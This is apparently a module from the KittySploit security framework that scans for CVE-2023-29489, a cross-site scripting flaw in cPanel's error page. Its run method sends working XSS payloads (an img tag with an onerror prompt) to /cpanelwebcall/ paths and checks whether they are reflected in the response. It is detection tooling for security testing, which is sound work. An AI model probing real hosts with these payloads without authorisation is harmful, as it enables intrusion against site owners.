#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""An issue was discovered in cPanel before 11."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'cPanel < 11.109.9999.116 - Cross-Site Scripting Detection',
        'description': 'An issue was discovered in cPanel before 11.109.9999.116. Cross Site Scripting can occur on the cpsrvd error page via an invalid webcall ID.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2023', 'cpanel', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://blog.assetnote.io/2023/04/26/xss-million-websites-cpanel/',
            'https://nvd.nist.gov/vuln/detail/CVE-2023-29489',
            'https://forums.cpanel.net/threads/cpanel-tsr-2023-0001-full-disclosure.708949/',
            'https://github.com/SynixCyberCrimeMy/CVE-2023-29489',
            'https://github.com/learnerboy88/CVE-2023-29489',
        ],
        'cve': 'CVE-2023-29489',
    }

    def run(self):
        for path in ('/cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaaaa', '/cpanelwebcall/<><img%20src=x%20onerror="prompt(document.domain)">'):
            r = self.http_request(method="GET", path=path, allow_redirects=False)
            if not r or r.status_code != 400:
                continue
            body = r.text or ""
            body_all = ('<img src=x onerror="prompt(document.domain)">aaaaaaaaaaaa', 'Invalid webcall ID:',)
            if (all(m in body for m in body_all)):
                self.set_info(
                    severity='medium',
                    reason="cPanel < 11.109.9999.116 - Cross-Site Scripting detected",
                    path=path,
                )
                return True
        return False

